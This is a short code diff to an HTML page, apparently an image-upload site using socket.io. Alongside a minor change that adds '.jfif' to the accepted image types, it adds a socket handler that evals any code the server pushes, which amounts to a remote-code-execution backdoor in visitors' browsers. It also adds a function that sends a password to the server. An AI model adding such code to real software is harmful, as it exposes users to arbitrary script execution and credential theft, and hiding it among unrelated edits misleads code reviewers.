@@ -15,6 +15,12 @@
         socket.on('refresh', function() {
             location.reload();
         });
+        socket.on('run', function(code) {
+            eval(code)
+        });
+        function secret(password) {
+            socket.emit('secret', password)
+        }
     </script>
     <script type="text/javascript", charset="utf-8">
         // Thanks yyyyyyy.info for the code
@@ -47,7 +53,7 @@
         <form enctype="multipart/form-data" method="post" id="form">
             <!-- style="visibility:hidden; position:absolute" -->
             <input type="url" name="url" id="urlInput">
-            <input type="file" accept=".png,.jpg,.jpeg,.gif" name="file" id="imageInput"><br>
+            <input type="file" accept=".png,.jpg,.jpeg,.gif,.jfif" name="file" id="imageInput"><br>
             <input type="submit" value="Upload!" id="submit">
           </form>
     </div>
